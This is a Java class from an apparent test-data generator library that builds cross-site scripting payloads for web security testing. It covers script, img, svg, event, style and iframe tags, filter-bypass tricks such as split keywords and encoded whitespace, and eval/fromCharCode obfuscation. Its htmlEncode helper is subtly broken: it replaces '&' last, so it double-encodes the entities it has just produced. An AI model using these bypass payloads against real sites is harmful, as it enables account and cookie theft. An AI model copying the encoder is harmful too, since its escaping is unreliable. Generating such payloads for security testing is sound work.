package com.dataforge.generators.internal;

import com.dataforge.core.DataForgeContext;
import com.dataforge.generators.spi.DataGenerator;
import com.dataforge.model.FieldConfig;
import java.security.SecureRandom;
import java.util.Arrays;
import java.util.List;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * XSS攻击脚本生成器
 *
 * <p>生成各种XSS攻击测试payload，用于Web安全测试、渗透测试等场景。
 *
 * <p>支持的参数：
 *
 * <ul>
 *   <li>attack_type: 攻击类型 (REFLECTED|STORED|DOM|BLIND) 默认: REFLECTED
 *   <li>payload_type: 载荷类型 (SCRIPT|IMG|IFRAME|SVG|EVENT|STYLE) 默认: SCRIPT
 *   <li>complexity: 复杂度 (SIMPLE|MEDIUM|COMPLEX) 默认: MEDIUM
 *   <li>encoding: 编码方式 (NONE|HTML|URL|UNICODE|HEX) 默认: NONE
 *   <li>bypass_filter: 是否绕过过滤器 默认: false
 * </ul>
 *
 * @author DataForge Team
 * @since 1.0.0
 */
public class XssPayloadGenerator extends BaseGenerator
    implements DataGenerator<String, FieldConfig> {

  private static final Logger logger = LoggerFactory.getLogger(XssPayloadGenerator.class);
  private static final SecureRandom random = new SecureRandom();

  // 基础脚本payload
  private static final List<String> SCRIPT_PAYLOADS =
      Arrays.asList(
          "<script>alert('XSS')</script>",
          "<script>alert(document.cookie)</script>",
          "<script>alert(document.domain)</script>",
          "<script>confirm('XSS')</script>",
          "<script>prompt('XSS')</script>");

  // 图片标签payload
  private static final List<String> IMG_PAYLOADS =
      Arrays.asList(
          "<img src=x onerror=alert('XSS')>",
          "<img src=javascript:alert('XSS')>",
          "<img src=# onerror=alert(document.cookie)>",
          "<img/src=x onerror=prompt('XSS')>");

  // 事件处理payload
  private static final List<String> EVENT_PAYLOADS =
      Arrays.asList(
          "<body onload=alert('XSS')>",
          "<input onfocus=alert('XSS') autofocus>",
          "<select onfocus=alert('XSS') autofocus>",
          "<textarea onfocus=alert('XSS') autofocus>",
          "<keygen onfocus=alert('XSS') autofocus>");

  // SVG payload
  private static final List<String> SVG_PAYLOADS =
      Arrays.asList(
          "<svg onload=alert('XSS')>",
          "<svg><script>alert('XSS')</script></svg>",
          "<svg/onload=alert('XSS')>",
          "<svg onload=alert(document.domain)>");

  // 样式payload
  private static final List<String> STYLE_PAYLOADS =
      Arrays.asList(
          "<style>@import'javascript:alert(\"XSS\")';</style>",
          "<link rel=stylesheet href=javascript:alert('XSS')>",
          "<style>body{background:url('javascript:alert(1)')}</style>");

  // 过滤器绕过技巧
  private static final List<String> BYPASS_TECHNIQUES =
      Arrays.asList(
          "javascript:",
          "vbscript:",
          "data:",
          "livescript:",
          "/**/",
          "<!--",
          "-->",
          "%0a",
          "%0d",
          "%09",
          "%20");

  @Override
  public String getType() {
    return "xss_payload";
  }

  @Override
  public Class<FieldConfig> getConfigClass() {
    return FieldConfig.class;
  }

  @Override
  public String generate(FieldConfig config, DataForgeContext context) {
    try {
      String attackType = getStringParam(config, "attack_type", "REFLECTED").toUpperCase();
      String payloadType = getStringParam(config, "payload_type", "SCRIPT").toUpperCase();
      String complexity = getStringParam(config, "complexity", "MEDIUM").toUpperCase();
      String encoding = getStringParam(config, "encoding", "NONE").toUpperCase();
      boolean bypassFilter = getBooleanParam(config, "bypass_filter", false);

      String payload = generatePayload(payloadType, attackType, complexity);

      if (bypassFilter) {
        payload = applyFilterBypass(payload);
      }

      payload = applyEncoding(payload, encoding);

      // 存储到上下文
      context.put("xss_attack_type", attackType);
      context.put("xss_payload_type", payloadType);
      context.put("xss_payload", payload);

      return payload;

    } catch (Exception e) {
      logger.error("Failed to generate XSS payload", e);
      return "<script>alert('XSS')</script>";
    }
  }

  private String generatePayload(String payloadType, String attackType, String complexity) {
    List<String> payloads;

    switch (payloadType) {
      case "SCRIPT":
        payloads = SCRIPT_PAYLOADS;
        break;
      case "IMG":
        payloads = IMG_PAYLOADS;
        break;
      case "EVENT":
        payloads = EVENT_PAYLOADS;
        break;
      case "SVG":
        payloads = SVG_PAYLOADS;
        break;
      case "STYLE":
        payloads = STYLE_PAYLOADS;
        break;
      case "IFRAME":
        payloads =
            Arrays.asList(
                "<iframe src=javascript:alert('XSS')></iframe>",
                "<iframe onload=alert('XSS')></iframe>");
        break;
      default:
        payloads = SCRIPT_PAYLOADS;
        break;
    }

    String basePayload = payloads.get(random.nextInt(payloads.size()));

    return enhancePayloadComplexity(basePayload, complexity, attackType);
  }

  private String enhancePayloadComplexity(
      String basePayload, String complexity, String attackType) {
    switch (complexity) {
      case "SIMPLE":
        return basePayload;
      case "COMPLEX":
        return addComplexFeatures(basePayload, attackType);
      case "MEDIUM":
      default:
        return addMediumFeatures(basePayload);
    }
  }

  private String addMediumFeatures(String payload) {
    // 添加中等复杂度特性
    if (random.nextBoolean()) {
      payload = payload.replace("alert", "window.alert");
    }
    if (random.nextBoolean()) {
      payload = payload.replace("'XSS'", "'XSS_" + random.nextInt(1000) + "'");
    }
    return payload;
  }

  private String addComplexFeatures(String payload, String attackType) {
    // 添加高复杂度特性
    payload = addMediumFeatures(payload);

    // DOM型XSS特殊处理
    if ("DOM".equals(attackType)) {
      payload =
          payload.replace(
              "alert('XSS')", "eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))");
    }

    // 添加混淆
    if (random.nextBoolean()) {
      payload = payload.replace("script", "scr\"+\"ipt");
    }

    return payload;
  }

  private String applyFilterBypass(String payload) {
    String technique = BYPASS_TECHNIQUES.get(random.nextInt(BYPASS_TECHNIQUES.size()));

    // 应用绕过技巧
    if (technique.contains("javascript:")) {
      payload = payload.replace("javascript:", "java\tscript:");
    } else if (technique.contains("/**/")) {
      payload = payload.replace("script", "scr/**/ipt");
    } else if (technique.startsWith("%")) {
      payload = payload.replace(" ", technique);
    } else {
      payload = technique + payload;
    }

    return payload;
  }

  private String applyEncoding(String payload, String encoding) {
    switch (encoding) {
      case "HTML":
        return htmlEncode(payload);
      case "URL":
        return urlEncode(payload);
      case "UNICODE":
        return unicodeEncode(payload);
      case "HEX":
        return hexEncode(payload);
      case "NONE":
      default:
        return payload;
    }
  }

  private String htmlEncode(String payload) {
    return payload
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace("\"", "&quot;")
        .replace("'", "&#x27;")
        .replace("&", "&amp;");
  }

  private String urlEncode(String payload) {
    return payload
        .replace("<", "%3C")
        .replace(">", "%3E")
        .replace("\"", "%22")
        .replace("'", "%27")
        .replace(" ", "%20")
        .replace("(", "%28")
        .replace(")", "%29");
  }

  private String unicodeEncode(String payload) {
    StringBuilder unicode = new StringBuilder();
    for (char c : payload.toCharArray()) {
      if (c == '<' || c == '>' || c == '"' || c == '\'') {
        unicode.append("\\u").append(String.format("%04x", (int) c));
      } else {
        unicode.append(c);
      }
    }
    return unicode.toString();
  }

  private String hexEncode(String payload) {
    StringBuilder hex = new StringBuilder();
    for (char c : payload.toCharArray()) {
      if (c == '<' || c == '>' || c == '"' || c == '\'') {
        hex.append("&#x").append(Integer.toHexString(c)).append(";");
      } else {
        hex.append(c);
      }
    }
    return hex.toString();
  }
}
